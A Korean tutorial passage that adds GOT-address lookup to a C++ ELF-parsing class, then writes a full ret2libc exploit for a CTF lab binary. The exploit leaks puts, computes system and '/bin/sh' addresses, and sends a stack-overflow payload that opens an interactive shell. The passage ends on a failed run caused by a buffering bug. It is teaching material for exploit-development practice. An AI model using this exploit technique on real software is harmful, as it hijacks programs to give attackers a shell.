

마지막으로 ELF 클래스에 got() 함수를 추가하는 작업만이 남았다. PLT와 GOT에 대한 추가 설명은 아래 링크로 대신한다.<br>
[PLT와 GOT 자세히 알기 1](https://bpsecblog.wordpress.com/2016/03/07/about_got_plt_1/)

<br>
앞서 binary에 설정된 stack canary check를 위해 해당 파일의 모든 symbol 정보를 가져오는 get_symbol() 함수를 작성했었다. ELF 클래스의 가장 마지막에 아래와 같이 수집한 symbol의 정보를 출력하는 print_symbols() 함수를 추가하고 실행해보자.

```cpp
void print_symbols()
{
    std::cout << ":::::::::::::::::::::::::::::::::::" << std::endl;
    for(const auto& [name, addr] : symbols)
    {
        std::stringstream stream;
        stream << name << std::setw(40 - name.length()) << "0x" << std::setw(8) << std::setfill('0') << std::hex << addr;
        std::cout << stream.str() << std::endl;
    }
    std::cout << ":::::::::::::::::::::::::::::::::::" << std::endl;
}
```

<br>
아래는 print_symbols()가 출력한 내용의 일부를 보여준다. 왼쪽은 symbol_name이고 오른쪽은 symbol_address이다.
![full](/assets/images/print_symbols.png)

위 화면을 잘 살펴보면 몇몇 symbol은 address가 제대로 출력되지 않은 것을 확인할 수 있는데, 주로 printf()나 strcpy() 같이 라이브러리에서 호출되는 symbol들인 것을 알 수 있다. 이들은 모두 프로그램 로딩 시에 재배치(relocation) 과정을 거치기 때문인데, 이들의 올바른 address를 수집하기 위해서는 재배치된 후의 address를 수집해야 한다. 따라서 우리는 이런 재배치 정보를 같이 읽어올 수 있도록 get_symbol() 함수를 업데이트 해야한다.

재배치 정보는 SHT_RELA과 SHT_REL 타입의 섹션을 읽음으로써 수집이 가능하다. 아쉽게도 ELFIO는 재배치된 symbol의 정보를 완벽하게 수집하는 함수가 없다. 따라서 기존 함수를 수정하여 재배치된 symbol 정보를 수집해야 한다.

먼저 relocation 정보를 저장할 구조체를 아래와 같이 선언하자.
```cpp
std::unordered_map<std::string, ELFIO::Elf64_Addr> relocations;
```

<br>
그리고 SHT_RELA와 SHT_REL 타입의 섹션에서 relocation 정보를 수집하는 코드를 아래와 같이 작성한다. relocation_section_accessor 구조체를 이용해 symbol 정보를 수집한다. 

```cpp
// add relocation info
else if(SHT_RELA == sec->get_type() || SHT_REL == sec->get_type())
{
    ELFIO::relocation_section_accessor reloc(reader, sec);
    for(ELFIO::Elf_Xword i = 0; i < reloc.get_entries_num(); ++i)
    {
        ELFIO::Elf64_Addr offset{0};
        ELFIO::Elf_Xword info{0};    // index of .dynsym;
        ELFIO::Elf_Word symbol;
        ELFIO::Elf_Word type{0};
        std::string symbolName;
        reloc.get_entry(i, offset, info, symbol, type, symbolName);
        relocations.emplace(symbolName, offset);
    }
}
```
<br>
위의 코드에서 relocations_section_accessor의 get_entry()는 우리가 추가해야 하는 함수이다. 해당 함수는 elfio_relocation.hpp에 있는 get_entry() 함수의 수정 버전이며 아래와 같다.

```cpp
bool get_entry( Elf_Xword   index,
                Elf64_Addr& offset,
                Elf_Xword&  info,
                Elf_Word&   symbol,
                Elf_Word&   type,
                std::string& symbolName) const
{
    if(index >= get_entries_num()){ // Is index valid
        return false;
    }

    // get symbol by index
    Elf_Sxword  addend;
    get_entry(index, offset, symbol, type, addend);

    // get symbol name
    symbol_section_accessor symbols(elf_file, elf_file.sections[get_symbol_table_index()]);

    Elf64_Addr symbolValue;
    Elf_Xword size;
    Elf_Half section;
    unsigned char bind, symbolType, other;
    symbols.get_symbol( symbol,
                        symbolName,
                        symbolValue,
                        size,
                        bind,
                        symbolType,
                        section,
                        other);
												
    if(elf_file.get_class() == ELFCLASS32){
        if(SHT_REL == relocation_section->get_type()){
            generic_get_entry_rel<Elf32_Rel>(index, offset, info, symbol, type);
        }
        else if(SHT_RELA == relocation_section->get_type()){
            generic_get_entry_rela<Elf32_Rela>(index, offset, info, symbol, type);
        }
    }
    else {
        if(SHT_REL == relocation_section->get_type()){
            generic_get_entry_rel<Elf64_Rel>(index, offset, info, symbol, type);
        }
        else if(SHT_RELA == relocation_section->get_type()){
            generic_get_entry_rela<Elf64_Rela>(index, offset, info, symbol, type);
        }
    }

    return true;
}
```
<br>
추가된 함수인 get_entry()는 SHT_RELA 또는 SHT_REL 섹션을 순회하면서 각 엔트리별로 정보를 수집하는데, 이 때 symbol의 이름과 address를 가져온다. 위의 함수에서 호출되는 generic_get_entry_rel() 과 generic_get_entry_rela() 함수 역시 추가된 함수이며 그 내용은 아래와 같다.

```cpp
template <class T>
void generic_get_entry_rel( Elf_Xword   index,
                            Elf64_Addr& offset,
                            Elf_Xword&   info,
                            Elf_Word&   symbol,
                            Elf_Word&   type ) const
{
    const endianess_convertor& convertor = elf_file.get_convertor();

    const T* pEntry = reinterpret_cast<const T*>(
        relocation_section->get_data() + index * relocation_section->get_entry_size()
    );
    offset        = convertor( pEntry->r_offset );
    info          = convertor( pEntry->r_info );
    Elf_Xword tmp = convertor( pEntry->r_info );
    symbol        = get_sym_and_type<T>::get_r_sym( tmp );
    type          = get_sym_and_type<T>::get_r_type( tmp );
}

template <class T>
void generic_get_entry_rela( Elf_Xword   index,
                             Elf64_Addr& offset,
                             Elf_Xword&   info,
                             Elf_Word&   symbol,
                             Elf_Word&   type ) const
{
    const endianess_convertor& convertor = elf_file.get_convertor();

    const T* pEntry = reinterpret_cast<const T*>(
        relocation_section->get_data() + index * relocation_section->get_entry_size()
    );
    offset        = convertor( pEntry->r_offset );
    info          = convertor( pEntry->r_info );
    symbol        = get_sym_and_type<T>::get_r_sym( info );
    type          = get_sym_and_type<T>::get_r_type( info );
}
```
<br>
마지막으로 모든 섹션에 대한 탐색이 끝나면 (for 구문이 종료되면) 수집된 relocation 정보에서 symbol들의 주소를 업데이트 한다.

```cpp
for(const auto& [name, address] : relocations)
{
    if(auto it = symbols.find(name); it != symbols.end())
    {
        it->second = relocations[name];
    }
}
```

<br>
아래는 위의 함수를 추가한 후의 실행결과를 보여준다. 예상대로 이제 라이브러리에서 호출되는 함수들의 address가 제대로 수집된 것을 알 수 있다.
![full](/assets/images/print_symbols2.png)

<br>
지금까지 수집한 symbol들의  address는 got() 내 address이다. 이제 수집된 symbol들의 정보에서 address를 반환하는 got() 함수를 아래와 같이 추가하자.

```cpp
std::string get_symbol(const std::string& name)
{
    if(symbols.find(name) != symbols.end())
    {
        std::stringstream stream;
        stream << "0x" << std::setw(8) << std::setfill('0') << std::hex << symbols[name];
        return stream.str();
    }
    return "not found";
}

std::string got(const std::string& name)
{
    return get_symbol(name);
}
```
<br>
아래는 완성된 소스와 그 실행 결과이다. pwntools의 결과와 비교해보면 정확하게 수집했음을 알 수 있다.

```cpp
#include <iostream>
#include <mutex>

#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <boost/endian/buffers.hpp>
#include <boost/format.hpp>

#include "elfio/elfio.hpp"
#include "elfio/elf_types.hpp"

class PROCESS
{

private:
    std::string m_path;
    boost::asio::io_context io;
    boost::process::async_pipe input;
    boost::process::async_pipe output;
    boost::process::async_pipe error;
    boost::process::child c;
    boost::system::error_code ec;

    std::recursive_mutex lock;
    const int buffer_length{4096};

public:

    PROCESS(const std::string& _path)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    PROCESS(const std::string& _path, const std::vector<std::string>& args)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::args(args),
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    ~PROCESS()
    {
        std::cout << "[*] Stopping process... pid is " << std::to_string(c.id()) << std::endl;
        c.terminate();
    }

    const std::string recv_until(const std::string& delim)
    {
        std::string str;
        boost::asio::streambuf buf;
        buf.prepare(buffer_length);
        if(const auto size{boost::asio::read_until(output, buf, delim, ec)}; size != 0)
        {
            if(ec && ec != boost::asio::error::eof)
            {
                throw boost::system::system_error(ec);
            }
            str += buffer_to_string(buf, size);
            buf.consume(size);
        }
        return str;
    }

    size_t send(const std::string& data)
    {
        const auto length{boost::asio::write(input, boost::asio::buffer(data, data.length()), ec)};
        if(ec && ec != boost::asio::error::eof){throw boost::system::system_error(ec);}
        
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::stringstream stream;
        stream << "0x" << std::hex << length;
        std::cout << std::endl;
        std::cout << "Sent " << std::hex << stream.str() << " bytes:" << std::endl;
        dump_hex(data.c_str(), data.size());
        
        return length;
    }

    size_t send_line(const std::string& data)
    {
        auto str{data};
        str.append("\n");
        return send(str);
    }

    void interactive()
    {
        locked_output("[*] Switching to interactive mode");
        while(true)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
            lock.lock();
            std::cout << "$ ";
            lock.unlock();

            std::string s;
            std::getline(std::cin, s);
            if(s.empty()) continue;
            send_line(s);
            read_at_once();
        }
    }

private:
    void init()
    {
        std::cout << "[*] Starting process... pid is " << std::to_string(c.id()) << std::endl;
        // read_at_once();
        io.run();
    }

    const std::string buffer_to_string(const boost::asio::streambuf &buffer, const size_t& size)
    {
        return {buffers_begin(buffer.data()), buffers_begin(buffer.data()) + size};
    }

    void read_at_once()
    {
        boost::thread out_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(output, buf, boost::asio::transfer_at_least(1), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        out_thread.try_join_for(boost::chrono::milliseconds(200));
        
        boost::thread error_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(error, buf, boost::asio::transfer_at_least(10), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        error_thread.try_join_for(boost::chrono::milliseconds(200));
    }

    void dump_hex(const void* data, size_t size)
    {
        char ascii[17] = {0};
        for(size_t i = 0; i < size; ++i)
        {
            printf("%02X ", ((unsigned char*)data)[i]);
            if(((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~')
            {
                ascii[i % 16] = ((unsigned char*)data)[i];
            }
            else
            {
                ascii[i % 16] = '.';
            }
            if((i+1) % 8 == 0 || i+1 == size)
            {
                printf(" ");
                if ((i+1) % 16 == 0)
                {
                    printf("|  %s \n", ascii);
                }
                else if (i+1 == size)
                {
                    ascii[(i+1) % 16] = '\0';
                    if ((i+1) % 16 <= 8)
                    {
                        printf(" ");
                    }
                    for (size_t j = (i+1) % 16; j < 16; ++j)
                    {
                        printf("   ");
                    }
                    printf("|  %s \n", ascii);
                }
            }
        }
        std::cout << std::endl;
    }

    void locked_output(const std::string& s)
    {
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::cout << s << std::endl;
    }

};

const std::string conv_ascii(std::string hex)
{
    std::string ascii{""};
    for(size_t i = 0; i < hex.length(); i += 2)
    {
        const auto part{hex.substr(i, 2)};
        char ch = stoul(part, nullptr, 16);
        ascii += ch;
    }
    return ascii;
}

const std::string p32(const int& number)
{
    const int reversed{boost::endian::endian_reverse(number)};
    return conv_ascii((boost::format("%x") % reversed).str());
}

class ELF
{
private:
    ELFIO::elfio reader;
    std::string m_path;
    std::unordered_map<ELFIO::Elf64_Half, std::string> machines = {
        { EM_NONE, "No machine" },
        ...
        { EM_CUDA, "NVIDIA CUDA architecture " }
    };
    std::unordered_map<char, std::string> endians = {
        { ELFDATANONE, "None" },
        { ELFDATA2LSB, "Little endian" },
        { ELFDATA2MSB, "Big endian" }
    };
    std::unordered_map<std::string, ELFIO::Elf64_Addr> symbols;

public:
    ELF(const std::string& path) : m_path(path)
    {
        if(!reader.load(path))
        {
            std::cerr << "Can't find or process ELF file " << path << std::endl;
            exit(-1);
        }

        std::cout << "[*] '" << m_path << "'" << std::endl;
        std::cout << "    Arch:     "
        << machines[reader.get_machine()] 
        << "-"
        << (reader.get_class() == ELFCLASS32 ? "32" : "64")
        << "-"
        << endians[reader.get_encoding()]
        << std::endl;

        std::cout << "    RELRO:    " << get_relro() << std::endl;
        std::cout << "    Stack:    " << get_canary() << std::endl;
        std::cout << "    NX:       " << get_nx() << std::endl;
        std::cout << "    PIE:      " << get_pie() << std::endl;
    }

    std::string get_symbol(const std::string& name)
    {
        if(symbols.find(name) != symbols.end())
        {
            std::stringstream stream;
            stream << "0x" << std::setw(8) << std::setfill('0') << std::hex << symbols[name];
            return stream.str();
        }
        return "not found";
    }

    std::string got(const std::string& name)
    {
        return get_symbol(name);
    }

private:

    std::string get_relro()
    {
        std::string relro{"No RELRO"};

        // search segment headers
        for(ELFIO::Elf_Half i{0}; i < reader.segments.size(); ++i)
        {
            ELFIO::segment* seg = reader.segments[i];
            if(PT_GNU_RELRO == seg->get_type())
            {
                relro = "Partial RELRO";
                break;
            }
        }

        // search dynamic sections
        for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_DYNAMIC == sec->get_type())
            {
                ELFIO::dynamic_section_accessor dynamic(reader, sec);
                for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
                {
                    ELFIO::Elf_Xword tag{0};
                    ELFIO::Elf_Xword value{0};
                    std::string str;
                    dynamic.get_entry(i, tag, value, str);
                    if(DT_FLAGS == tag && value == DF_BIND_NOW)
                    {
                        relro = "Full RELRO";
                        break;
                    }
                }
            }
        }
        return relro;
    }

    std::string get_canary()
    {
        std::string canary{"No canary found"};

        //
        // canary check
        //
        get_symbols();
        for(const auto& [symbol, addr] : symbols)
        {
            if(symbol.find("__stack_chk_fail") != std::string::npos)
            {
                canary = "Canary found";
                break;
            }
        }
        return canary;
    }

    std::string get_nx()
    {
        std::string nxbit{"NX disabled"};
        for(ELFIO::Elf_Half i = 0; i < reader.segments.size(); ++i)
        {
            ELFIO::segment *seg = reader.segments[i];
            if(PT_GNU_STACK == seg->get_type() && 7 != seg->get_flags())
            {
                nxbit = "NX enabled";
                break;
            }
        }
        return nxbit;
    }

    std::string get_pie()
    {
        std::string pie;

        if(ET_EXEC == reader.get_type()){pie = "No PIE";}
        else {pie = "Not ELF file";}

        // search dynamic sections
        bool find{false};
        for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_DYNAMIC == sec->get_type())
            {
                find = true;
                ELFIO::dynamic_section_accessor dynamic(reader, sec);
                for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
                {
                    ELFIO::Elf_Xword tag{0};
                    ELFIO::Elf_Xword value{0};
                    std::string str;
                    dynamic.get_entry(i, tag, value, str);
                    if(DT_DEBUG == tag)
                    {
                        if(ET_DYN == reader.get_type())
                        {
                            pie = "PIE enabled";
                        }
                    }
                }
            }
        }
        if(!find)
        {
            if(ET_DYN == reader.get_type())
            {
                pie = "DSO";
            }
        }
        return pie;
    }

    void print_symbols()
    {
        std::cout << ":::::::::::::::::::::::::::::::::::" << std::endl;
        for(const auto& [name, addr] : symbols)
        {
            std::stringstream stream;
            stream << name << std::setw(40 - name.length()) << "0x" << std::setw(8) << std::setfill('0') << std::hex << addr;
            std::cout << stream.str() << std::endl;
        }
        std::cout << ":::::::::::::::::::::::::::::::::::" << std::endl;
    }
        
    void get_symbols()
    {
        std::unordered_map<std::string, ELFIO::Elf64_Addr> relocations;
        for(ELFIO::Elf_Half i = 0; i < reader.sections.size(); ++i)
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_SYMTAB == sec->get_type() || SHT_DYNSYM == sec->get_type())
            {
                ELFIO::symbol_section_accessor symbol(reader, sec);
                for(ELFIO::Elf_Xword i = 0; i < symbol.get_symbols_num(); ++i)
                {
                    std::string name;
                    ELFIO::Elf64_Addr value{0};
                    ELFIO::Elf_Xword  size{0};
                    unsigned char bind{0};
                    unsigned char type{0};
                    ELFIO::Elf_Half section{0};
                    unsigned char other{0};
                    symbol.get_symbol(i, name, value, size, bind, type, section, other);
                    if(!name.empty())
                    {
                        symbols.emplace(name, value);
                    }
                }
            }
            // add relocation info
            else if(SHT_RELA == sec->get_type() || SHT_REL == sec->get_type())
            {
                ELFIO::relocation_section_accessor reloc(reader, sec);
                for(ELFIO::Elf_Xword i = 0; i < reloc.get_entries_num(); ++i)
                {
                    ELFIO::Elf64_Addr offset{0};
                    ELFIO::Elf_Xword info{0};    // index of .dynsym;
                    ELFIO::Elf_Word symbol;
                    ELFIO::Elf_Word type{0};
                    std::string symbolName;
                    reloc.get_entry(i, offset, info, symbol, type, symbolName);
                    relocations.emplace(symbolName, offset);
                }
            }
        }   // end of for

        for(const auto& [name, address] : relocations)
        {
            if(auto it = symbols.find(name); it != symbols.end())
            {
                it->second = relocations[name];
            }
        }
    }
};

int main()
{
    try
    {
        ELF e{"/tmp/hitcon/LAB/lab4/ret2lib"};
        std::cout << e.got("puts") << std::endl;
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```
![full](/assets/images/my_symbols.png)

![full](/assets/images/pwntools_symbols.png)

<br>
실수한 부분이 있는데 pwntools의 ELF.got() 함수는 address를 int형으로 반환한다. 따라서 우리도 got() 함수가 int형을 반환하도록 수정해야 한다.
<br>
아래는 수정된 got() 함수이다.
```cpp
int got(const std::string& name)
{
    if(symbols.find(name) != symbols.end())
    {
        return symbols[name];
    }
    return 0;
}
```
<br>
이제 필요한 모든 것을 완성하였으니 LAB4를 공략해보자. 앞에서 확인한 pwntools를 이용한 exploit을 참고하여 아래와 같이 제작하였다.

```cpp
#include <iostream>
#include <mutex>
#include <vector>

#include <boost/process.hpp>
#include <boost/asio.hpp>
#include <boost/thread.hpp>
#include <boost/chrono.hpp>
#include <boost/endian/buffers.hpp>
#include <boost/format.hpp>
#include <boost/algorithm/string.hpp>

#include "elfio/elfio.hpp"
#include "elfio/elf_types.hpp"

class PROCESS
{

private:
    std::string m_path;
    boost::asio::io_context io;
    boost::process::async_pipe input;
    boost::process::async_pipe output;
    boost::process::async_pipe error;
    boost::process::child c;
    boost::system::error_code ec;

    std::recursive_mutex lock;
    const int buffer_length{4096};

public:

    PROCESS(const std::string& _path)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    PROCESS(const std::string& _path, const std::vector<std::string>& args)
    : m_path(_path),
      input(io),
      output(io),
      error(io),
      c(m_path,
        boost::process::args(args),
        boost::process::std_out > output,
        boost::process::std_in < input,
        boost::process::std_err > error,
        io)
        {
            init();
        }

    ~PROCESS()
    {
        std::cout << "[*] Stopping process... pid is " << std::to_string(c.id()) << std::endl;
        c.terminate();
    }

    const std::string recv_line()
    {
        return recv_until("\n");
    }

    const std::string recv_until(const std::string& delim)
    {
        std::string str;
        boost::asio::streambuf buf;
        buf.prepare(buffer_length);
        if(const auto size{boost::asio::read_until(output, buf, delim, ec)}; size != 0)
        {
            if(ec && ec != boost::asio::error::eof)
            {
                throw boost::system::system_error(ec);
            }
            str += buffer_to_string(buf, size);
            buf.consume(size);
        }
        return str;
    }

    size_t send(const std::string& data)
    {
        const auto length{boost::asio::write(input, boost::asio::buffer(data, data.length()), ec)};
        if(ec && ec != boost::asio::error::eof){throw boost::system::system_error(ec);}
        
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::stringstream stream;
        stream << "0x" << std::hex << length;
        std::cout << std::endl;
        std::cout << "Sent " << std::hex << stream.str() << " bytes:" << std::endl;
        dump_hex(data.c_str(), data.size());
        
        return length;
    }

    size_t send_line(const std::string& data)
    {
        auto str{data};
        str.append("\n");
        return send(str);
    }

    void interactive()
    {
        locked_output("[*] Switching to interactive mode");
        while(true)
        {
            std::this_thread::sleep_for(std::chrono::milliseconds(1));
            lock.lock();
            std::cout << "$ ";
            lock.unlock();

            std::string s;
            std::getline(std::cin, s);
            if(s.empty()) continue;
            send_line(s);
            read_at_once();
        }
    }

private:
    void init()
    {
        std::cout << "[*] Starting process... pid is " << std::to_string(c.id()) << std::endl;
        // read_at_once();
        io.run();
    }

    const std::string buffer_to_string(const boost::asio::streambuf &buffer, const size_t& size)
    {
        return {buffers_begin(buffer.data()), buffers_begin(buffer.data()) + size};
    }

    void read_at_once()
    {
        boost::thread out_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(output, buf, boost::asio::transfer_at_least(1), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        out_thread.try_join_for(boost::chrono::milliseconds(200));
        
        boost::thread error_thread([&]()
        {
            boost::asio::streambuf buf;
            buf.prepare(buffer_length);
            if(const auto size{boost::asio::read(error, buf, boost::asio::transfer_at_least(10), ec)}; size != 0)
            {
                locked_output(buffer_to_string(buf, size));
                buf.consume(size);
            }
        });
        error_thread.try_join_for(boost::chrono::milliseconds(200));
    }

    void dump_hex(const void* data, size_t size)
    {
        char ascii[17] = {0};
        for(size_t i = 0; i < size; ++i)
        {
            printf("%02X ", ((unsigned char*)data)[i]);
            if(((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~')
            {
                ascii[i % 16] = ((unsigned char*)data)[i];
            }
            else
            {
                ascii[i % 16] = '.';
            }
            if((i+1) % 8 == 0 || i+1 == size)
            {
                printf(" ");
                if ((i+1) % 16 == 0)
                {
                    printf("|  %s \n", ascii);
                }
                else if (i+1 == size)
                {
                    ascii[(i+1) % 16] = '\0';
                    if ((i+1) % 16 <= 8)
                    {
                        printf(" ");
                    }
                    for (size_t j = (i+1) % 16; j < 16; ++j)
                    {
                        printf("   ");
                    }
                    printf("|  %s \n", ascii);
                }
            }
        }
        std::cout << std::endl;
    }

    void locked_output(const std::string& s)
    {
        std::lock_guard<std::recursive_mutex> guard(lock);
        std::cout << s << std::endl;
    }

};

class ELF
{
private:
    ELFIO::elfio reader;
    std::string m_path;
    std::unordered_map<ELFIO::Elf64_Half, std::string> machines = {
        { EM_NONE, "No machine" },
        ...
        { EM_CUDA, "NVIDIA CUDA architecture " }
    };
    std::unordered_map<char, std::string> endians = {
        { ELFDATANONE, "None" },
        { ELFDATA2LSB, "Little endian" },
        { ELFDATA2MSB, "Big endian" }
    };
    std::unordered_map<std::string, ELFIO::Elf64_Addr> symbols;

public:
    ELF(const std::string& path) : m_path(path)
    {
        if(!reader.load(path))
        {
            std::cerr << "Can't find or process ELF file " << path << std::endl;
            exit(-1);
        }

        std::cout << "[*] '" << m_path << "'" << std::endl;
        std::cout << "    Arch:     "
        << machines[reader.get_machine()] 
        << "-"
        << (reader.get_class() == ELFCLASS32 ? "32" : "64")
        << "-"
        << endians[reader.get_encoding()]
        << std::endl;

        std::cout << "    RELRO:    " << get_relro() << std::endl;
        std::cout << "    Stack:    " << get_canary() << std::endl;
        std::cout << "    NX:       " << get_nx() << std::endl;
        std::cout << "    PIE:      " << get_pie() << std::endl;
    }

    int got(const std::string& name)
    {
        if(symbols.find(name) != symbols.end())
        {
            return symbols[name];
        }
        return 0;
    }

private:

    std::string get_relro()
    {
        std::string relro{"No RELRO"};

        // search segment headers
        for(ELFIO::Elf_Half i{0}; i < reader.segments.size(); ++i)
        {
            ELFIO::segment* seg = reader.segments[i];
            if(PT_GNU_RELRO == seg->get_type())
            {
                relro = "Partial RELRO";
                break;
            }
        }

        // search dynamic sections
        for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_DYNAMIC == sec->get_type())
            {
                ELFIO::dynamic_section_accessor dynamic(reader, sec);
                for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
                {
                    ELFIO::Elf_Xword tag{0};
                    ELFIO::Elf_Xword value{0};
                    std::string str;
                    dynamic.get_entry(i, tag, value, str);
                    if(DT_FLAGS == tag && value == DF_BIND_NOW)
                    {
                        relro = "Full RELRO";
                        break;
                    }
                }
            }
        }
        return relro;
    }

    std::string get_canary()
    {
        std::string canary{"No canary found"};

        //
        // canary check
        //
        get_symbols();
        for(const auto& [symbol, addr] : symbols)
        {
            if(symbol.find("__stack_chk_fail") != std::string::npos)
            {
                canary = "Canary found";
                break;
            }
        }
        return canary;
    }

    std::string get_nx()
    {
        std::string nxbit{"NX disabled"};
        for(ELFIO::Elf_Half i = 0; i < reader.segments.size(); ++i)
        {
            ELFIO::segment *seg = reader.segments[i];
            if(PT_GNU_STACK == seg->get_type() && 7 != seg->get_flags())
            {
                nxbit = "NX enabled";
                break;
            }
        }
        return nxbit;
    }

    std::string get_pie()
    {
        std::string pie;

        if(ET_EXEC == reader.get_type()){pie = "No PIE";}
        else {pie = "Not ELF file";}

        // search dynamic sections
        bool find{false};
        for(ELFIO::Elf_Half i{0}; i < reader.sections.size(); ++i )
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_DYNAMIC == sec->get_type())
            {
                find = true;
                ELFIO::dynamic_section_accessor dynamic(reader, sec);
                for(ELFIO::Elf_Xword i{0}; i < dynamic.get_entries_num(); ++i)
                {
                    ELFIO::Elf_Xword tag{0};
                    ELFIO::Elf_Xword value{0};
                    std::string str;
                    dynamic.get_entry(i, tag, value, str);
                    if(DT_DEBUG == tag)
                    {
                        if(ET_DYN == reader.get_type())
                        {
                            pie = "PIE enabled";
                        }
                    }
                }
            }
        }
        if(!find)
        {
            if(ET_DYN == reader.get_type())
            {
                pie = "DSO";
            }
        }
        return pie;
    }

    void print_symbols()
    {
        std::cout << ":::::::::::::::::::::::::::::::::::" << std::endl;
        for(const auto& [name, addr] : symbols)
        {
            std::stringstream stream;
            stream << name << std::setw(40 - name.length()) << "0x" << std::setw(8) << std::setfill('0') << std::hex << addr;
            std::cout << stream.str() << std::endl;
        }
        std::cout << ":::::::::::::::::::::::::::::::::::" << std::endl;
    }
        
    void get_symbols()
    {
        std::unordered_map<std::string, ELFIO::Elf64_Addr> relocations;
        for(ELFIO::Elf_Half i = 0; i < reader.sections.size(); ++i)
        {
            ELFIO::section* sec = reader.sections[i];
            if(SHT_SYMTAB == sec->get_type() || SHT_DYNSYM == sec->get_type())
            {
                ELFIO::symbol_section_accessor symbol(reader, sec);
                for(ELFIO::Elf_Xword i = 0; i < symbol.get_symbols_num(); ++i)
                {
                    std::string name;
                    ELFIO::Elf64_Addr value{0};
                    ELFIO::Elf_Xword  size{0};
                    unsigned char bind{0};
                    unsigned char type{0};
                    ELFIO::Elf_Half section{0};
                    unsigned char other{0};
                    symbol.get_symbol(i, name, value, size, bind, type, section, other);
                    if(!name.empty())
                    {
                        symbols.emplace(name, value);
                    }
                }
            }
            // add relocation info
            else if(SHT_RELA == sec->get_type() || SHT_REL == sec->get_type())
            {
                ELFIO::relocation_section_accessor reloc(reader, sec);
                for(ELFIO::Elf_Xword i = 0; i < reloc.get_entries_num(); ++i)
                {
                    ELFIO::Elf64_Addr offset{0};
                    ELFIO::Elf_Xword info{0};    // index of .dynsym;
                    ELFIO::Elf_Word symbol;
                    ELFIO::Elf_Word type{0};
                    std::string symbolName;
                    reloc.get_entry(i, offset, info, symbol, type, symbolName);
                    relocations.emplace(symbolName, offset);
                }
            }
        }   // end of for

        for(const auto& [name, address] : relocations)
        {
            if(auto it = symbols.find(name); it != symbols.end())
            {
                it->second = relocations[name];
            }
        }
    }
};

const std::string conv_ascii(std::string hex)
{
    std::string ascii{""};
    for(size_t i = 0; i < hex.length(); i += 2)
    {
        const auto part{hex.substr(i, 2)};
        char ch = stoul(part, nullptr, 16);
        ascii += ch;
    }
    return ascii;
}

const std::string p32(const int& number)
{
    const int reversed{boost::endian::endian_reverse(number)};
    return conv_ascii((boost::format("%x") % reversed).str());
}

std::string hex(const int& addr)
{
    std::stringstream stream;
    stream << "0x" << std::setw(8) << std::setfill('0') << std::hex << addr;
    return stream.str();
}

std::string str(const int& num)
{
    return std::to_string(num);
}

int main()
{
    try
    {
        PROCESS p("/tmp/hitcon/LAB/lab4/ret2lib");
        ELF e{"/tmp/hitcon/LAB/lab4/ret2lib"};
        const int puts_got{e.got("puts")};
        std::cout << "[*] found address of puts got : " << hex(puts_got) << std::endl;
        
        std::cout << p.recv_until(":");
        p.send(str(puts_got));
        std::string line{p.recv_line()};    //The content of the address : 0xf7d98290
        
        std::vector<std::string> vec;
        boost::split(vec, line, boost::is_any_of(":"));
        std::string s{boost::algorithm::trim_copy(vec.at(1))};
        int puts_addr{(int)strtol(boost::algorithm::trim_copy(vec.at(1)).c_str(), NULL, 0)};

        const int sys_offset{0x24d40};
        const int binsh_offset{0xfd548};
        const int system_addr{puts_addr - sys_offset};
        const int binsh_addr{puts_addr + binsh_offset};

        std::cout << "[*] address of puts : " << hex(puts_addr) << std::endl;
        std::cout << "[*] address of system : " << hex(system_addr) << std::endl;
        std::cout << "[*] address of /bin/sh string : " << hex(binsh_addr) << std::endl;

        std::string payload;
        for(auto i = 0; i < 60; ++i)
        {
            payload.append("A");
        }
        payload.append(p32(system_addr));
        payload.append("AAAA");
        payload.append(p32(binsh_addr));

        std::cout << p.recv_until(":");
        p.send_line(payload);
        p.interactive();
    }
    catch (std::exception& e)
    {
        std::cerr << "Exception: " << __FUNCTION__ << " " << e.what() << "\n";
    }

    return 0;
}
```
![full](/assets/images/fail.png)

하지만 위의 실행결과를 보면 제대로 실행이 되지 않는다. 소스를 디버깅 해 보면 두 번째 recv_until(":") 부분에서  계속 대기중인 것을 알 수 있다.
원인은 682라인의 p.recv_line()인데, 실제 호출되는 recv_until("\n")에서 버퍼에 읽어들인 문자열이 "\n"이 위치한 곳보다 더 많이 읽어 들였기 때문이다. 

